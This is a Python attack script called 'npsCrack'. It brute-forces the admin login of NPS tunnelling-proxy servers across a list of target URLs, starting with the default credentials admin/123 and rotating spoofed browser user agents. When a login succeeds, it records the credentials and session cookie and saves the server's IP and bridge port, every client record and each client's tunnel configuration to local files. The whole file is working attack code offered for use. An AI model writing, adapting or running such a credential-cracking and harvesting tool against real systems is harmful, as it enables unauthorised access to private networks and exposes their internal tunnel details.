'''
Author         : Sp4ce
Date           : 2020-11-23 11:31:02
LastEditors    : Sp4ce
LastEditTime   : 2020-11-24 19:52:05
Description    : Challenge Everything.
'''
import argparse
import json
import logging
import os
import random
import re
import time
import sys
from urllib.parse import urlparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(lineno)d - %(message)s ')
logger = logging.getLogger()

USER_AGENTS = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
    "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
]


class npsCrack:
    def __init__(self, targetFile, usernameFile, passwordFile):
        self.loginUrl = "{URL}/login/verify"
        self.tunnelUrl = "{URL}/index/gettunnel"
        self.clientUrl = "{URL}/client/list"
        self.loginSession = ""
        self.targetFile = targetFile
        self.usernameFile = usernameFile
        self.passwordFile = passwordFile
        self.urls = []
        self.password = ['123']
        self.username = ['admin']
        self.target = ""
        self.hostname = ""
        self.savePath = ""
        self.nowDate = time.strftime("%Y%m%d%H%M%S", time.localtime())
        self.timeout = 20
        self.clientsId = []
        self.headers = {}
        self.headers["User-Agent"] = random.choice(USER_AGENTS)
        self.headers[
            'Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        if not os.path.isdir('result'):
            logger.warning('Result folder not exist. Now create.')
            try:
                os.makedirs('result')
                logger.info("Result folder create success.")
            except:
                logger.error('Result folder create failed.')
        else:
            logger.debug('Result folder already exist.')
        logger.info("Init success.")

    '''
    Request:
    POST /login/verify HTTP/1.1
    username=admin&password=123

    Response:
    JSON:
    success:
    {
        "msg": "login success",
        "status": 1
    }
    error:
    {
        "msg": "username or password incorrect",
        "status": 0
    }
    '''

    def checkLogin(self, url, usernameFile, passwordFile):
        data = "username={USERNAME}&password={PASSWORD}"
        for username in usernameFile:
            for passwords in passwordFile:
                logger.info(
                    "Try to use {USERNAME}/{PASSWORD} to sign in {TARGET}".
                    format(USERNAME=username, PASSWORD=passwords, TARGET=url))
                try:
                    res = requests.post(self.loginUrl.format(URL=url),
                                    data=data.format(USERNAME=username,
                                                     PASSWORD=passwords),
                                    headers=self.headers,
                                    timeout=self.timeout,
                                    verify=False)
                    resStatus = json.loads(res.text)
                    if resStatus['status'] == 1:
                        with open('success.txt', 'a+') as f:
                            f.write(url + '-----' + username + '----' + passwords +
                                    '\n')
                        self.loginSession = res.headers['Set-Cookie']
                        self.target = url
                        logger.info("{URL} Login Success.".format(URL=url))
                        logger.info("Get Availed Cookies : {COOKIES}".format(
                            COOKIES=res.headers['Set-Cookie']))
                        logger.info("Parsing hostname and create folder.")
                        _url = urlparse(url)
                        hostname = _url.hostname
                        savePath = 'result/' + str(hostname)
                        self.hostname = hostname
                        self.savePath = savePath
                        if not os.path.isdir(savePath):
                            try:
                                os.makedirs(savePath)
                                logger.info(
                                    "Create {savePath} folder success.".format(
                                        savePath=savePath))
                            except:
                                logger.error(
                                    "Create {savePath} folder failed.".format(
                                        savePath=savePath))
                        else:
                            logger.info(
                                "Save path [{savePath}] already exist.".format(
                                    savePath=savePath))
                        logger.info("Now get clients and server info.")
                        return True
                    else:
                        logger.warning(
                            "{URL} Login Failed with {USERNAME}/{PASSWORD}".format(
                                URL=url, USERNAME=username, PASSWORD=passwords))
                        pass
                except:
                    logger.error("{URL} Connect Failed.".format(URL=url))
                    pass

    '''
    Request:
    POST /client/list HTTP/1.1
    search=&order=asc&offset=0&limit=10

    Response:
    JSON{
        "bridgePort": Int,
        "bridgeType": "String",
        "ip": "String",
        "rows": [Array],
        "total": Int
    }
    '''

    def getNpsInfo(self, url):
        data = {}
        data['search'] = ""
        data['order'] = "asc"
        data['offset'] = "0"
        data['limit'] = "10"
        self.headers['Cookie'] = self.loginSession
        res = requests.post(self.clientUrl.format(URL=url),
                            data=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            verify=False)
        resJson = json.loads(res.text)
        #logger.info(resJson)
        totalClients = resJson['total']
        #write server data
        if 'ip' in resJson:
            serverIP = resJson['ip']
            serverBridgePort = resJson['bridgePort']
            serverBridgeType = resJson['bridgeType']
            logger.warning(
                "NPS server IP:{IP} bridgeport:{BRIDGEPORT} bridgetype:{BRIDGETYPE}."
                .format(IP=serverIP,
                        BRIDGEPORT=serverBridgePort,
                        BRIDGETYPE=serverBridgeType))
            saveFilename = self.savePath + '/ServerInfo-' + self.nowDate + '.txt'
            writeData = "ServerIP : " + serverIP + '\n'
            writeData += "ServerBridgePort : " + str(serverBridgePort) + '\n'
            writeData += "ServerBridgeType : " + serverBridgeType + '\n'
            with open(saveFilename, "a+") as f:
                f.write(writeData)
            
        else:
            logger.warning("NPS server IP:{IP}".format(IP=self.hostname))
            saveFilename = self.savePath + '/ServerInfo-' + self.nowDate + '.txt'
            with open(saveFilename, "a+") as f:
                f.write(json.dumps(resJson['rows'],indent=2))
        #get all client info
        data['limit'] = totalClients
        logger.info("Get {TOTALNUMS} clients.".format(TOTALNUMS=totalClients))
        res = requests.post(self.clientUrl.format(URL=url),
                            data=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            verify=False)
        resJson = json.loads(res.text)
        allRows = resJson['rows']
        saveFilename = self.savePath + '/ClientsInfo-' + self.nowDate + '.json'
        with open(saveFilename, "a+") as f:
            f.write(json.dumps(allRows, indent=2))
        for row in allRows:
            self.clientsId.append(row['Id'])
        self.getNpsTunnelInfo(self.target)

    '''
    Request:
    POST /index/gettunnel HTTP/1.1
    offset=0&limit=10&type=&client_id=2&search=

    Response:
    JSON:
    {
        "rows": [Array],
        "total": Int
    }
    '''

    def getNpsTunnelInfo(self, url):
        if not os.path.isdir(self.savePath + '/tunnels'):
            logger.warning('Tunnels folder not exist,now create it.')
            try:
                os.makedirs(self.savePath + '/tunnels')
                logger.info('Tunnels folder create success.')
            except:
                logger.error('Tunnels folder create failed.')
        data = {}
        data['offset'] = '0'
        data['limit'] = '10'
        data['type'] = ''
        data['search'] = ''
        for i in self.clientsId:
            data['client_id'] = i
            try:
                res = requests.post(url=self.tunnelUrl.format(URL=url),
                                data=data,
                                headers=self.headers,
                                timeout=self.timeout,
                                verify=False)
                logger.info('Get client {CLIENTID} tunnels success.'.format(CLIENTID=i))
                saveFilename = self.savePath + '/tunnels/Client-[' + str(
                    i) + ']-Tunnels-Info.json'
                resJson = json.loads(res.text)
                allRows = resJson['rows']
                if len(allRows) > 0:
                    with open(saveFilename, 'a+') as f:
                        f.write(json.dumps(allRows, indent=2))
            except:
                logger.error('Tunnels connect failed.')
        self.clientsId=[]


    def run(self):
        if os.path.isfile(self.targetFile):
            with open(self.targetFile) as target:
                self.urls = target.read().splitlines()
        else:
            self.urls = self.targetFile

        if self.passwordFile is not None and os.path.isfile(self.passwordFile):
            with open(self.passwordFile) as password:
                self.password = password.read().splitlines()
        elif self.passwordFile == None:
            pass
        else:
            self.password.append(self.passwordFile)

        if self.usernameFile is not None and os.path.isfile(self.usernameFile):
            with open(self.usernameFile) as username:
                self.username = username.read().splitlines()
        elif self.usernameFile == None:
            pass
        else:
            self.username.append(self.usernameFile)
        logger.info(
            "Load {0} Username(s) and {1} Password(s) For Test {2} Target(s).".
            format(len(self.username), len(self.password), len(self.urls)))
        for url in self.urls:
            if self.checkLogin(url, self.username, self.password):
                self.getNpsInfo(self.target)


if __name__ == "__main__":
    print('''
     _   _              _____                _    
    | \\ | |            / ____|              | |   
    |  \\| |_ __  ___  | |     _ __ __ _  ___| | __
    | . ` | \'_ \\/ __| | |    | \'__/ _` |/ __| |/ /
    | |\\  | |_) \\__ \\ | |____| | | (_| | (__|   < 
    |_| \\_| .__/|___/  \\_____|_|  \\__,_|\\___|_|\\_\\
          | |                               
          |_|                 Author: Sp4ce
    ''')
    parser = argparse.ArgumentParser()
    parser.add_argument("-target",
                        "--targetFile",
                        type=str,
                        help="Load targets file or single target.")
    parser.add_argument(
        "-username",
        "--usernameFile",
        type=str,
        help="Load usernames file or single username.(default admin)")
    parser.add_argument(
        "-password",
        "--passwordFile",
        type=str,
        help="Load passwords file or single password.(default 123)")
    args = parser.parse_args()
    if len(sys.argv) < 2:
        parser.print_help()
    else:
        start = npsCrack(args.targetFile, args.usernameFile, args.passwordFile)
        start.run()
